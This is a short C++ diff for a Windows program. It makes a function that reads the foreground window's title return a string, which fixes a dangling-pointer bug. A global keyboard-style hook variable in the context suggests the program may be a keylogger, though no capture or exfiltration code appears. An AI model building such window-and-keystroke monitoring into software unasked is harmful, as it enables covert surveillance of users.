@@ -8,12 +8,16 @@ HHOOK kHook = nullptr;
 bool g_Run = false;
 
 
-const char* GetActiveWindow_Title() {
+std::string GetActiveWindow_Title() {
     char buffer[1024];
+    ZeroMemory(buffer, 1024);
+    std::string strOut = "";
     if (GetWindowTextA(GetForegroundWindow(), buffer, 1024) == 0) {
-        std::memcpy(buffer, "Sin titulo\0", 11);
+        strOut = "Sin Titulo";
+    }else {
+        strOut = buffer;
     }
-    return buffer;
+    return strOut;
 }
 
 std::string Add_Terminator(const char* cBuffer) {
